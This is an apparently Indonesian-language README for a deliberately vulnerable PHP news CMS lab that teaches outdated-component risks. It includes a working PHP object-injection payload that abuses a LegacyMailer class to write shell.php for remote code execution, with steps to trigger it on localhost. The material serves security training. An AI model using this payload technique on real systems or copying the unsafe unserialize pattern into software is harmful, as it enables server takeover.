# 📦 InsecureLibrary Lab — Legacy News CMS

**OWASP A06: Vulnerable and Outdated Components**

## Port

`http://localhost:8011`

## Skenario

Aplikasi CMS berita ini menggunakan library internal `legacy_lib.php` yang sudah usang. Library ini memiliki kerentanan **PHP Object Injection** karena menggunakan `unserialize()` pada data yang bisa dikontrol pengguna.

## Cara Eksploitasi

Aplikasi menerima data serial PHP pada parameter `POST data`. Attacker dapat memanfaatkan class `LegacyMailer` di dalam library untuk melakukan **Arbitrary File Write** yang berujung pada **Remote Code Execution (RCE)**.

### Contoh Payload RCE:

```php
O:12:"LegacyMailer":3:{s:9:"recipient";s:5:"admin";s:8:"template";s:19:"<?php phpinfo(); ?>";s:8:"log_file";s:9:"shell.php";}
```

Kirim payload di atas via form, lalu akses `http://localhost:8011/shell.php`.

## Cara Start

```bash
cd InsecureLibrary && docker-compose up -d
```
